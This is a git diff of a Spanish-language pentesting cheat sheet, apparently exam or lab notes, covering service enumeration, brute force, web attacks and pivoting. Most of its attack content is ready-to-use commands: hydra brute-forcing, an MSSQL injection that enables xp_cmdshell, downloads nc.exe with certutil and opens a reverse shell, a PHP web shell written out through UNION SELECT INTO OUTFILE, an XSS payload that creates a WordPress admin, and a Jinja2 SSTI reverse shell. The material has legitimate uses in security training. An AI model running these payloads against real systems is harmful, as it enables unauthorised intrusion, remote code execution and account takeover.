 El Protocolo de Transferencia de Archivos (FTP, por sus siglas en inglés) es un protocolo de red utilizado para la transferencia de archivos entre sistemas que están conectados a una red TCP/IP, basado en una arquitectura *cliente-servidor*. Este protocolo permite la transmisión eficiente de archivos a través de la red, proporcionando servicios de autenticación y control de acceso.
 
 Por defecto, el puerto asignado para la comunicación FTP es el puerto 21.
-####  4.1.1. <
+####  4.1.1. <a name='nmap-1'></a>Nmap
 
 Cuando lanzamos una enumeración usando Nmap, se utilizan por defecto una serie de scripts que comprueban si se permite el acceso de forma anonima.
 
@@ -535,8 +506,7 @@ Scripts de `nmap` utiles para este servicio:
 sudo nmap -p21 --script=ftp-anon <RHOST> -vvv
 ```
 
-####  4.1.2. <a name='conexión-al-
-<a id="markdown-%3Ca-name%3D'conexi%C3%B3n-al-s" name="%3Ca-name%3D'conexi%C3%B3n-al-s"></a>s
+####  4.1.2. <a name='conexión-al-servidor-ftp'></a>Conexión al servidor FTP
 
 ```bash
 # -A: Esta opción es específica del cliente FTP y suele utilizarse para activar 
@@ -550,8 +520,7 @@ nc -nvc <RHOST> 21
 telnet <RHOST> 21
 ```
 
-####  4.1.3. <a name='interactuar-con-el
-<a id="markdown-%3Ca-name%3D'interactuar-con-el-" name="%3Ca-name%3D'interactuar-con-el-"></a>-
+####  4.1.3. <a name='interactuar-con-el-cliente-ftp'></a>Interactuar con el cliente FTP
 
 ```bash
 ftp> anonymous # usuario
@@ -578,8 +547,7 @@ ftp> mdelete *.txt # borra multiples archivos que cumplan con el patrón
 ftp> exit # abandona la conexión ftp
 ```
 
-####  4.1.4. <a n
-<a id="markdown-%3Ca-na" name="%3Ca-na"></a>a
+####  4.1.4. <a name='netexec'></a>Netexec
 
 ```bash
 nxc ftp <RHOST> -u <USER> -p <PASSWORD>
@@ -590,29 +558,25 @@ nxc ftp <RHOST> -u <USER> -p <PASSWORD> --ls <DIRECTORY>
 nxc ftp <RHOST> -u <USER> -p <PASSWORD> --get <FILE>
 nxc ftp <RHOST> -u <USER> -p <PASSWORD> --put <FILE>
 ```
-####  4.1.5. <a name='fuerza-bruta-de-
-<a id="markdown-%3Ca-name%3D'fuerza-bruta-de-c" name="%3Ca-name%3D'fuerza-bruta-de-c"></a>c
+####  4.1.5. <a name='fuerza-bruta-de-credenciales'></a>Fuerza bruta de credenciales
 
 ```bash
 hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ftp://<RHOST>
 ```
 
-####  4.1.6. <a name='archivos-de-c
-<a id="markdown-%3Ca-name%3D'archivos-de-co" name="%3Ca-name%3D'archivos-de-co"></a>o
+####  4.1.6. <a name='archivos-de-configuración'></a>Archivos de configuración
 
 - `/etc/ftpusers`
 - `/etc/vsftpd.conf`
 - `/etc/ftp.conf`
 - `/etc/proftpd.conf`
 
-####  4.1.7. <a name='descar
-<a id="markdown-%3Ca-name%3D'descarg" name="%3Ca-name%3D'descarg"></a>g
+####  4.1.7. <a name='descargar-archivos'></a>Descargar archivos
 
 ```bash
 wget -m ftp://anonymous:anonymous@<RHOST>
 ```
-###  4.2. <a nam
-<a id="markdown-%3Ca-name" name="%3Ca-name"></a>e
+###  4.2. <a name='smb-(445)'></a>SMB (445)
 
 SMB (Server Message Block) es un protocolo diseñado para la compartición de archivos en red, facilitando la interconexión de archivos y periféricos como impresoras y puertos serie entre ordenadores dentro de una red local (LAN).
 
@@ -626,7 +590,7 @@ El protocolo SMB utiliza dos niveles de autenticación, a saber:
     
 - **Autenticación de recurso compartido**: los usuarios deben proporcionar una contraseña para acceder a un recurso compartido restringido.
 
-####  4.2.1. <
+####  4.2.1. <a name='nmap-2'></a>Nmap
 
 Scripts de `nmap` utiles para este servicio:
 
@@ -645,8 +609,7 @@ Sintaxis:
 ```bash
 sudo nmap -p445 --script <script> <RHOST>
 ```
-####  4.2.2. <a nam
-<a id="markdown-%3Ca-name" name="%3Ca-name"></a>e
+####  4.2.2. <a name='smbclient'></a>smbclient
 
 Es un cliente que nos permite acceder a recursos compartidos en servidores SMB.
 
@@ -661,8 +624,7 @@ smbclient //<RHOST>/Public -N
 smbclient //<RHOST>/Public -U elliot
 ```
 
-####  4.2.3. <a 
-<a id="markdown-%3Ca-n" name="%3Ca-n"></a>n
+####  4.2.3. <a name='smbmap'></a>smbmap
 
 SMBMap permite a los usuarios enumerar las unidades compartidas samba en todo un dominio. Enumera las unidades compartidas, los permisos de las unidades, el contenido compartido, la funcionalidad de carga/descarga, la coincidencia de patrones de descarga automática de nombres de archivo e incluso la ejecución de comandos remotos.
 
@@ -694,8 +656,7 @@ smbmap -H <RHOST> -u <USER> -p <PASSWORD> --download 'tmp/file'
 smbmap -u <USER> -p <PASSWORD> -H <RHOST> -x 'ipconfig'
 ```
 
-####  4.2.4. <a name
-<a id="markdown-%3Ca-name%3D" name="%3Ca-name%3D"></a>=
+####  4.2.4. <a name='enum4linux'></a>enum4linux
 
 Enum4linux es una herramienta utilizada para extraer información de hosts de Windows y Samba. La herramienta está escrita en Perl y envuelta en herramientas de samba `smbclient`, `rpcclient`, `net` y `nslookup`.
 
@@ -721,8 +682,7 @@ enum4linux -i <RHOST>
 enum4linux -r -u <user> -p <password> <RHOST>
 ```
 
-####  4.2.5. <a n
-<a id="markdown-%3Ca-na" name="%3Ca-na"></a>a
+####  4.2.5. <a name='netexec-1'></a>Netexec
 
 Netexec, anteriormente conocido como **CrackMapExec (CME)**, es una herramienta de código. que permite automatizar tareas relacionadas con la enumeración y explotación de sistemas Windows y Linux, como la ejecución de comandos remotos, la obtención de credenciales y la evaluación de la seguridad en entornos de redes grandes. Netexec permite realizar tareas de forma masiva en múltiples sistemas a la vez, facilitando la identificación de vulnerabilidades y configuraciones incorrectas en una red.
 
@@ -779,8 +739,7 @@ nxc smb <RHOST> -u <USER> -p <PASSWORD> --wmi
 nxc smb <RHOST> -u <USER> -p <PASSWORD> --wmi-namespace
 ```
 
-####  4.2.6. <a nam
-<a id="markdown-%3Ca-name" name="%3Ca-name"></a>e
+####  4.2.6. <a name='rpcclient'></a>Rpcclient
 
 Rpcclient es una utilidad que forma parte del conjunto de herramientas Samba. Se utiliza para interactuar con el protocolo Remote Procedure Call (RPC) de Microsoft, que se utiliza para la comunicación entre los sistemas basados en Windows y otros dispositivos. rpcclient se utiliza principalmente para fines de depuración y pruebas, y se puede utilizar para consultar y manipular sistemas remotos.
 
@@ -821,15 +780,13 @@ La sintaxis básica del parámetro `-c` es la siguiente:
 rpcclient -U username //<RHOST> -c "command1; command2; command3"
 ```
 
-####  4.2.7. <a name='rid-cy
-<a id="markdown-%3Ca-name%3D'rid-cyc" name="%3Ca-name%3D'rid-cyc"></a>c
+####  4.2.7. <a name='rid-cycling-attack'></a>RID Cycling Attack
 
 ```bash
 seq 1 5000 | xargs -P 50 -I{} rpcclient -U "" 30.30.30.4 -N -c "lookupsids S-1-22-1-{}" 2>&1
 ```
 
-####  4.2.8. <a name='smb-d
-<a id="markdown-%3Ca-name%3D'smb-de" name="%3Ca-name%3D'smb-de"></a>e
+####  4.2.8. <a name='smb-desde-windows'></a>SMB desde Windows
 
 ```powershell
 # listar recursos compartidos
@@ -855,8 +812,7 @@ Recursos compartidos comunes en Windows:
 - `SYSVOL` sólo en DCs    
 - `NETLOGON` sólo en los DC
 
-####  4.2.9. <a name='interactuar-con-el
-<a id="markdown-%3Ca-name%3D'interactuar-con-el-" name="%3Ca-name%3D'interactuar-con-el-"></a>-
+####  4.2.9. <a name='interactuar-con-el-cliente-smb'></a>Interactuar con el cliente SMB
 
 ```
 smb: \> help # muestra la ayuda
@@ -865,27 +821,24 @@ smb: \> put file.txt # subir un archivo
 smb: \> get file.txt # descargar un archivo
 ```
 
-####  4.2.10. <a name='montar-una-recurs
-<a id="markdown-%3Ca-name%3D'montar-una-recurso" name="%3Ca-name%3D'montar-una-recurso"></a>o
+####  4.2.10. <a name='montar-una-recurso-compartido'></a>Montar una recurso compartido
 
 ```bash
 mount -t cifs -o "username=user,password=password" //<RHOST>/share /mnt/share
 ```
 
-####  4.2.11. <a name='fuerza-bruta-de-
-<a id="markdown-%3Ca-name%3D'fuerza-bruta-de-c" name="%3Ca-name%3D'fuerza-bruta-de-c"></a>c
+####  4.2.11. <a name='fuerza-bruta-de-credenciales-1'></a>Fuerza bruta de credenciales
 
 ```bash
 nmap --script smb-brute -p 445 <RHOST>
 hydra -l admin -P /usr/share/wordlist/rockyou.txt <RHOST> smb
 ```
 
-###  4.3. <a name='
-<a id="markdown-%3Ca-name%3D'm" name="%3Ca-name%3D'm"></a>m
+###  4.3. <a name='mysql-(3306)'></a>MYSQL (3306)
 
 MySQL es un sistema de gestión de bases de datos relacional de código abierto. Es ampliamente utilizado para almacenar, gestionar y recuperar datos en diversas aplicaciones, desde sitios web hasta sistemas empresariales. MySQL es conocido por su alta performance, escalabilidad, y confiabilidad. Ofrece soporte para múltiples usuarios y transacciones simultáneas, y utiliza el lenguaje SQL (Structured Query Language) para la gestión de los datos. MySQL es compatible con numerosas plataformas y se integra fácilmente con lenguajes de programación como PHP, Java y Python.
 
-####  4.3.1. <
+####  4.3.1. <a name='nmap-3'></a>Nmap
 
 Scripts de `nmap` utiles para este servicio:
 
@@ -921,15 +874,13 @@ sudo nmap -p 3306 --script=mysql-audit --script-args="mysql-audit.username='root
 sudo nmap -p 3306 --script=mysql-query --script-args="query='select * from books.authors;',username='root',password=''" <RHOST> -vvv
 ```
 
-####  4.3.2. <a name='
-<a id="markdown-%3Ca-name%3D'f" name="%3Ca-name%3D'f"></a>f
+####  4.3.2. <a name='fuerza-bruta'></a>Fuerza bruta
 
 ```bash
 hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<RHOST> mysql
 ```
 
-####  4.3.3. <a name='coma
-<a id="markdown-%3Ca-name%3D'coman" name="%3Ca-name%3D'coman"></a>n
+####  4.3.3. <a name='comandos-básicos'></a>Comandos básicos
 
 ```mysql
 SHOW DATABASES; # listar las bases de datos
@@ -941,12 +892,11 @@ SELECT <column_name>,<column_name>,<column_name...> FROM <TABLE>; # listar el co
 SHOW EVENTS; # mostrar los eventos programados
 ```
 
-###  4.4. <a name='
-<a id="markdown-%3Ca-name%3D'm" name="%3Ca-name%3D'm"></a>m
+###  4.4. <a name='mssql-(1433)'></a>MSSQL (1433)
 
 MSSQL, o Microsoft SQL Server, es un sistema de gestión de bases de datos relacional desarrollado por Microsoft. Es utilizado para almacenar y recuperar datos según las necesidades de diferentes aplicaciones, desde pequeñas a grandes empresas. MSSQL ofrece características avanzadas como soporte para transacciones, integridad referencial, seguridad robusta y herramientas de administración y desarrollo. Es conocido por su integración estrecha con otros productos de Microsoft, como .NET Framework y Azure, y utiliza T-SQL (Transact-SQL) como su lenguaje de consulta.
 
-####  4.4.1. <
+####  4.4.1. <a name='nmap-4'></a>Nmap
 
 Scripts de `nmap` utiles para este servicio:
 
@@ -977,8 +927,7 @@ sudo nmap -p 1433 --script ms-sql-query --script-args mssql.username=<USER>,mssq
 sudo nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=<USER>,mssql.password=<PASSWORD>,ms-sql-xp-cmdshell.cmd="type C:\flag.txt" <RHOST>
 ```
 
-####  4.4.2. <a n
-<a id="markdown-%3Ca-na" name="%3Ca-na"></a>a
+####  4.4.2. <a name='netexec-2'></a>Netexec
 
 ```bash
 # Realiza una consulta SQL
@@ -1002,8 +951,7 @@ nxc mssql <RHOST> -u <USER> -p <PASSWORD> --share <SHARE_NAME> --get-file <REMOT
 # Subir un archivo local en una ubicación remota
 nxc mssql <RHOST> -u <USER> -p <PASSWORD> --share <SHARE_NAME> --put-file <LOCAL_FILENAME> <REMOTE_FILENAME>
 ```
-####  4.4.3. <a na
-<a id="markdown-%3Ca-nam" name="%3Ca-nam"></a>m
+####  4.4.3. <a name='conexión'></a>Conexión
 
 ```powershell
 sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>'
@@ -1020,8 +968,7 @@ impacket-mssqlclient <RHOST>/<USERNAME>:<USERNAME>@<RHOST> -windows-auth
 export KRB5CCNAME=<USERNAME>.ccache
 impacket-mssqlclient -k <RHOST>.<DOMAIN
 ```
-####  4.4.4. <a name='coma
-<a id="markdown-%3Ca-name%3D'coman" name="%3Ca-name%3D'coman"></a>n
+####  4.4.4. <a name='comandos-básicos-1'></a>Comandos básicos
 
 ```sql
 SELECT @@version;
@@ -1029,16 +976,14 @@ SELECT name FROM sys.databases;
 SELECT * FROM <DATABASE>.information_schema.tables;
 SELECT * FROM <DATABASE>.dbo.users;
 ```
-####  4.4.5. <a name='mostrar-el-contenido-de-una-b
-<a id="markdown-%3Ca-name%3D'mostrar-el-contenido-de-una-ba" name="%3Ca-name%3D'mostrar-el-contenido-de-una-ba"></a>a
+####  4.4.5. <a name='mostrar-el-contenido-de-una-base-de-datos'></a>Mostrar el contenido de una base de datos
 
 ```sql
 1> SELECT name FROM master.sys.databases
 2> go
 ```
 
-####  4.4.6. <a name='ejecuci
-<a id="markdown-%3Ca-name%3D'ejecuci%C3%B3" name="%3Ca-name%3D'ejecuci%C3%B3"></a>ó
+####  4.4.6. <a name='ejecución-de-código'></a>Ejecución de código
 
 En MSSQL gracias a la palabra clave `execute`, podemos ejecutar el comando arbitrario en el sistema operativo. Para hacer eso primero tenemos que habilitar la ejecución del comando dentro de la base de datos de la siguiente forma:
 
@@ -1054,8 +999,7 @@ De esta forma, ya podemos ejecutar comandos:
 ```sql
 EXECUTE xp_cmdshell 'whoami'
 ```
-###  4.5. <a name='postg
-<a id="markdown-%3Ca-name%3D'postgr" name="%3Ca-name%3D'postgr"></a>r
+###  4.5. <a name='postgresql-(5432)'></a>PostgreSQL (5432)
 
 ```sql
 psql
@@ -1064,8 +1008,7 @@ psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
 psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
 ```
 
-####  4.5.1. <a name='coma
-<a id="markdown-%3Ca-name%3D'coman" name="%3Ca-name%3D'coman"></a>n
+####  4.5.1. <a name='comandos-comunes'></a>Comandos Comunes
 
 ```sql
 postgres=# \list                                                            // listar todas las bases de datos
@@ -1084,8 +1027,7 @@ postgres=# \q                                                               // s
 <DATABASE>=# SELECT pg_read_file('/PATH/TO/FILE/<FILE>', 0, 1000000); --    // Leer un archivo
 ```
 
-####  4.5.2. <a name='ejecución-remo
-<a id="markdown-%3Ca-name%3D'ejecuci%C3%B3n-remot" name="%3Ca-name%3D'ejecuci%C3%B3n-remot"></a>t
+####  4.5.2. <a name='ejecución-remota-de-código'></a>Ejecución Remota de Código
 
 ```sql
 <DATABASE>=# DROP TABLE IF EXISTS cmd_exec;
@@ -1095,8 +1037,7 @@ postgres=# \q                                                               // s
 <DATABASE>=# DROP TABLE IF EXISTS cmd_exec;
 ```
 
-###  4.6. <a name='snmp
-<a id="markdown-%3Ca-name%3D'snmp-" name="%3Ca-name%3D'snmp-"></a>-
+###  4.6. <a name='snmp-(161---udp)'></a>SNMP (161 - UDP)
 
 El Protocolo Simple de Administración de Red, o SNMP por sus siglas en inglés, es un protocolo basado en UDP que, inicialmente, fue implementado de manera no muy segura. Cuenta con una base de datos (MIB) que almacena información relacionada con la red. El puerto predeterminado de SNMP es el 161 UDP. Hasta la tercera versión de este protocolo, SNMPv3, la seguridad de SNMP era deficiente. Existen diversas herramientas para interactuar con SNMP, ya que este protocolo puede proporcionarnos mucha información acerca de una organización, basándose en las respuestas del servidor. Algunas herramientas útiles incluyen _onesixtyone_ para realizar ataques de fuerza bruta básicos y enumeración, y _snmpwalk_ para acceder a los datos de la base de datos MIB.
 
@@ -1133,13 +1074,11 @@ snmpwalk -v2c -c public <IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
 
 Referencias: [HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/index.html)
 
-###  4.7. <a name
-<a id="markdown-%3Ca-name%3D" name="%3Ca-name%3D"></a>=
+###  4.7. <a name='rdp-(3389)'></a>RDP (3389)
 
 El protocolo RDP (Remote Desktop Protocol) es un protocolo de red desarrollado por Microsoft que permite a los usuarios conectarse de manera remota a una computadora con Windows. Utiliza el puerto 3389 por defecto y permite que los usuarios controlen una máquina a distancia, viendo su escritorio y utilizando aplicaciones como si estuvieran frente a ella. Es ampliamente utilizado para administración remota y soporte técnico.
 
-####  4.7.1. <a na
-<a id="markdown-%3Ca-nam" name="%3Ca-nam"></a>m
+####  4.7.1. <a name='xfreerdp'></a>xfreerdp
 
 ```bash
 xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /cert-ignore
@@ -1149,8 +1088,7 @@ xfreerdp /v:<RHOST> /u:<USERNAME> /d:<DOMAIN> /pth:'<HASH>' /dynamic-resolution 
 xfreerdp /v:<RHOST> /dynamic-resolution +clipboard /tls-seclevel:0 -sec-nla
 rdesktop <RHOST>
 ```
-####  4.7.2. <a n
-<a id="markdown-%3Ca-na" name="%3Ca-na"></a>a
+####  4.7.2. <a name='netexec-3'></a>Netexec
 
 ```bash
 # Si NLA está deshabilitado, le permitirá tomar una captura de pantalla del mensaje de inicio de sesión
@@ -1165,12 +1103,11 @@ nxc rpd <RHOST> -u <USER> -p <PASSWORD> --screentime <SCREENTIME>
 # Enumerar las sesiones activas en el objetivo
 nxc rpd <RHOST> -u <USER> -p <PASSWORD> --res <RESOLUTION>
 ```
-##  5. <
+##  5. <a name='web'></a>Web
 
-###  5.1. <a name='enu
-<a id="markdown-%3Ca-name%3D'enum" name="%3Ca-name%3D'enum"></a>m
+###  5.1. <a name='enumeración'></a>Enumeración Web
 
-####  5.1.1. <
+####  5.1.1. <a name='fuff'></a>Fuff
 
 ```bash
 # Fuzzing de directorios y archivos
@@ -1196,8 +1133,7 @@ ffuf -c -fw 2644 -u "http://<RHOST>/admin/FUZZ.php" -w /usr/share/wordlists/secl
 ffuf -c -ac -t 250 -fc 400,404,412 -u https://<RHOST>/api/v1/FUZZ -w api_seen_in_wild.txt 
 ```
 
-####  5.1.2. <a na
-<a id="markdown-%3Ca-nam" name="%3Ca-nam"></a>m
+####  5.1.2. <a name='gobuster'></a>Gobuster
 
 ```bash
 gobuster dir -u http://<RHOST>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
@@ -1219,8 +1155,7 @@ Parámetros:
 - `-b` Excluye códigos de estado
 - `--wildcard` Establecer la opción comodín
 
-####  5.1.3. <
-<a id="markdown-%3Ca" name="%3Ca"></a>a 
+####  5.1.3. <a name='wfuzz'></a>Wfuzz
 
 ```bash
 # Fuzzing de directorio
@@ -1240,19 +1175,16 @@ wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "username=FUZZ&password=<
 wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "username=FUZZ&password=<PASSWORD>" -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt --ss "Username or Password Invalid"
 ```
 
-####  5.1.4. <a na
-<a id="markdown-%3Ca-nam" name="%3Ca-nam"></a>m
+####  5.1.4. <a name='gittools'></a>GitTools
 
 ```bash
 python3 git-dumper.py http://<RHOST>/.git/ website
 ./extractor.sh website
 ```
 
-###  5.2. <a name='enumer
-<a id="markdown-%3Ca-name%3D'enumera" name="%3Ca-name%3D'enumera"></a>a
+###  5.2. <a name='enumeración-de-cms'></a>Enumeración de CMS
 
-####  5.2.1. <a nam
-<a id="markdown-%3Ca-name" name="%3Ca-name"></a>e
+####  5.2.1. <a name='wordpress'></a>Wordpress
 ##### WPScan
 
 Enumeración de temas y plugins Wordpress
@@ -1279,28 +1211,24 @@ nuclei -u http://<RHOST>/wordpress/ -tags fuzz -t /home/d4redevil/.local/nuclei-
 gobuster dir -u http://<RHOST>/wordpress/ -w /usr/share/seclists/Discovery/WebContent/CMS/wp-plugins.fuzz.txt
 ```
 
-####  5.2.2. <a 
-<a id="markdown-%3Ca-n" name="%3Ca-n"></a>n
+####  5.2.2. <a name='joomla'></a>Joomla
 
 ```bash
 joomscan -u http://<RHOST>
 ```
 
-####  5.2.3. <a 
-<a id="markdown-%3Ca-n" name="%3Ca-n"></a>n
+####  5.2.3. <a name='drupal'></a>Drupal
 
 ```bash
 droopescan scan drupal -u http://<RHOST> -t 32
 ```
 
-####  5.2.4. <a n
-<a id="markdown-%3Ca-na" name="%3Ca-na"></a>a
+####  5.2.4. <a name='magento'></a>Magento
 
 ```bash
 php magescan.phar scan:all http://<RHOST>
 ```
-###  5.3. <a name='local-file-inc
-<a id="markdown-%3Ca-name%3D'local-file-incl" name="%3Ca-name%3D'local-file-incl"></a>l
+###  5.3. <a name='local-file-inclusion-(lfi)'></a>Local File Inclusion (LFI)
 
 ```
 http://<RHOST>/<FILE>.php?file=
@@ -1309,21 +1237,18 @@ http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd
 ```
 
 #### Hasta php 5.3
-<a id="markdown-hasta-php-5.3" name="hasta-php-5.3"></a>
 
 ```
 http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd%00
 ```
 
 #### php://filter Wrapper
-<a id="markdown-php%3A%2F%2Ffilter-wrapper" name="php%3A%2F%2Ffilter-wrapper"></a>
 
 ```
 url=php://filter/convert.base64-encode/resource=app.php
 ```
 
 #### Archivos Linux
-<a id="markdown-archivos-linux" name="archivos-linux"></a>
 
 ```
 /app/etc/local.xml
@@ -1602,7 +1527,6 @@ url=php://filter/convert.base64-encode/resource=app.php
 ```
 
 #### Archivos Windows
-<a id="markdown-archivos-windows" name="archivos-windows"></a>
 
 ```
 C:/Users/Administrator/NTUser.dat
@@ -1675,11 +1599,9 @@ C:/Windows/System32/inetsrv/config/applicationHost.config
 C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
 ```
 
-###  5.4. <a name='s
-<a id="markdown-%3Ca-name%3D'sq" name="%3Ca-name%3D'sq"></a>q
+###  5.4. <a name='sql-injection'></a>SQL Injection
 
-####  5.4.1. <
-<a id="markdown-%3Ca" name="%3Ca"></a>a 
+####  5.4.1. <a name='mysql'></a>MySQL
 
 ##### Obtener el número de columnas
 
@@ -1734,8 +1656,7 @@ LOAD_FILE('/etc/httpd/conf/httpd.conf')
 ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/<FILE>.php" -- //
 ```
 
-####  5.4.2. <
-<a id="markdown-%3Ca" name="%3Ca"></a>a 
+####  5.4.2. <a name='mssql'></a>MSSQL
 
 ##### Bypass de Autenticación
 
@@ -1764,8 +1685,7 @@ LOAD_FILE('/etc/httpd/conf/httpd.conf')
 ' EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.45.206:/nc.exe C:\windows\temp\nc.exe';EXEC xp_cmdshell 'C:\windows\temp\nc.exe 192.168.45.206 4444 -e cmd.exe';--
 ```
 
-####  5.4.3. <a name
-<a id="markdown-%3Ca-name%3D" name="%3Ca-name%3D"></a>=
+####  5.4.3. <a name='oracle-sql'></a>Oracle SQL
 
 ##### Bypass de Autenticación
 
@@ -1797,8 +1717,7 @@ LOAD_FILE('/etc/httpd/conf/httpd.conf')
 ' union select null,PASSWORD||USER_ID||USER_NAME,null from WEB_USERS--
 ```
 
-####  5.4.4. <a name='error-based-sql-inje
-<a id="markdown-%3Ca-name%3D'error-based-sql-injec" name="%3Ca-name%3D'error-based-sql-injec"></a>c
+####  5.4.4. <a name='error-based-sql-injection-(sqli)'></a>Error-based SQL Injection (SQLi)
 
 
 ```sql
@@ -1818,8 +1737,7 @@ SELECT * FROM users WHERE user_name= '<USERNAME>' OR 1=1 --
 ' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
 ```
 
-####  5.4.5. <a name='union-based-sql-inje
-<a id="markdown-%3Ca-name%3D'union-based-sql-injec" name="%3Ca-name%3D'union-based-sql-injec"></a>c
+####  5.4.5. <a name='union-based-sql-injection-(sqli)'></a>UNION-based SQL Injection (SQLi)
 
 > https://d4redevil.gitbook.io/d4redevil/owasp-top-10-y-vulnerabilidades-web/inyecciones-sql/inyecciones-sql-basada-en-uniones
 
@@ -1865,15 +1783,13 @@ http://<RHOST>/index.php?user=<USERNAME>' AND 1=1 -- //
 http://<RHOST>/index.php?user=<USERNAME>' AND 1=1 -- //
 ```
 
-####  5.4.6. <a name='sql-trunc
-<a id="markdown-%3Ca-name%3D'sql-trunca" name="%3Ca-name%3D'sql-trunca"></a>a
+####  5.4.6. <a name='sql-truncation-attack'></a>SQL Truncation Attack
 
 ```bash
 'admin@<FQDN>' = 'admin@<FQDN>++++++++++++++++++++++++++++++++++++++htb'
 ```
 
-###  5.5. <a name='cross-site-scr
-<a id="markdown-%3Ca-name%3D'cross-site-scri" name="%3Ca-name%3D'cross-site-scri"></a>i
+###  5.5. <a name='cross-site-scripting-(xss)'></a>Cross-Site Scripting (XSS)
 
 ```html
 <sCrIpt>alert(1)</ScRipt>
@@ -1886,8 +1802,7 @@ http://<RHOST>/index.php?user=<USERNAME>' AND 1=1 -- //
 <img src='http://<RHOST>'/>
 ```
 
-####  5.5.1. <a name='petición-ví
-<a id="markdown-%3Ca-name%3D'petici%C3%B3n-v%C3%ADa" name="%3Ca-name%3D'petici%C3%B3n-v%C3%ADa"></a>a
+####  5.5.1. <a name='petición-vía-ajax---get'></a>Petición vía Ajax - GET
 
 ```javascript
 var ajaxRequest = new XMLHttpRequest();
@@ -1899,8 +1814,7 @@ var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
 var nonce = nonceMatch[1];
 ```
 
-####  5.5.2. <a name='petición-vía
-<a id="markdown-%3Ca-name%3D'petici%C3%B3n-v%C3%ADa-" name="%3Ca-name%3D'petici%C3%B3n-v%C3%ADa-"></a>-
+####  5.5.2. <a name='petición-vía-ajax---post'></a>Petición vía Ajax - POST
 ```javascript
 var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=<USERNAME>&email=<EMAIL>&pass1=<PASSWORD>&pass2=<PASSWORD>&role=administrator";
 ajaxRequest = new XMLHttpRequest();
@@ -1909,8 +1823,7 @@ ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"
 ajaxRequest.send(params);
 ```
 
-####  5.5.3. <a name='comp
-<a id="markdown-%3Ca-name%3D'compr" name="%3Ca-name%3D'compr"></a>r
+####  5.5.3. <a name='comprimir-script'></a>Comprimir script
 
 > https://jscompress.com/
 
@@ -1919,44 +1832,35 @@ var params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=<USERNAM
 ```
 
 
-###  5.6. <a name='xml-external-
-<a id="markdown-%3Ca-name%3D'xml-external-e" name="%3Ca-name%3D'xml-external-e"></a>e
-###  5.7. <a name='server-side-request-fo
-<a id="markdown-%3Ca-name%3D'server-side-request-for" name="%3Ca-name%3D'server-side-request-for"></a>r
-###  5.8. <a name='server-side-template-inje
-<a id="markdown-%3Ca-name%3D'server-side-template-injec" name="%3Ca-name%3D'server-side-template-injec"></a>c
+###  5.6. <a name='xml-external-entity-(xxe)'></a>XML External Entity (XXE)
+###  5.7. <a name='server-side-request-forgery-(ssrf)'></a>Server-Side Request Forgery (SSRF)
+###  5.8. <a name='server-side-template-injection-(ssti)'></a>Server-Side Template Injection (SSTI)
 
 ```bash
 http://<RHOST>/index.php?view=<RHOST>://shell.php
 ```
 
-####  5.8.1. <a name='m
-<a id="markdown-%3Ca-name%3D'ma" name="%3Ca-name%3D'ma"></a>a
+####  5.8.1. <a name='magic-payload'></a>Magic Payload
 
 ```bash
 {{ ''.__class__.__mro__[1].__subclasses__() }}
 ```
 
-####  5.8.2. <a name='jinja-2---r
-<a id="markdown-%3Ca-name%3D'jinja-2---re" name="%3Ca-name%3D'jinja-2---re"></a>e
+####  5.8.2. <a name='jinja-2---reverse-shell'></a>Jinja 2 - Reverse Shell
 
 ```python
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'").read()}}{%endif%}{%endfor%}
 ```
 
-##  6. <a na
-<a id="markdown-%3Ca-nam" name="%3Ca-nam"></a>m
+##  6. <a name='pivoting'></a>Pivoting
 
-###  6.1. <a 
-<a id="markdown-%3Ca-n" name="%3Ca-n"></a>n
-####  6.1.1. <a name='servido
-<a id="markdown-%3Ca-name%3D'servidor" name="%3Ca-name%3D'servidor"></a>r
+###  6.1. <a name='chisel'></a>Chisel
+####  6.1.1. <a name='servidor-(atacante)'></a>Servidor (Atacante)
 
 ```bash
 chisel server -p 8000 --reverse --socks5
 ```
-####  6.1.2. <a name='clien
-<a id="markdown-%3Ca-name%3D'client" name="%3Ca-name%3D'client"></a>t
+####  6.1.2. <a name='cliente-(víctima)'></a>Cliente (Víctima)
 
 Linux
 
@@ -1974,8 +1878,7 @@ Windows
 - Proxy socks en puerto Kali 4444
 - Mapea 9001 MS01 a 9001 Kali
 - Mapea 8888 MS01 a 80 Kali
-####  6.1.3. <
-<a id="markdown-%3Ca" name="%3Ca"></a>a 
+####  6.1.3. <a name='socat'></a>Socat
 
 Port Forwarding
 
@@ -1991,41 +1894,35 @@ socat TCP-LISTEN:8282,fork TCP:127.0.0.1:8080 &
 
 > En este caso, el puerto `8080` no esta expuesto fuera del equipo local, pero con el comando anterior exponemos el puerto hacia fuera a través del puerto `8282`.
 
-###  6.2. <a nam
-<a id="markdown-%3Ca-name" name="%3Ca-name"></a>e
+###  6.2. <a name='ligolo-ng'></a>Ligolo-ng
 
-####  6.2.1. <a name='descargar-el-proxy
-<a id="markdown-%3Ca-name%3D'descargar-el-proxy-" name="%3Ca-name%3D'descargar-el-proxy-"></a>-
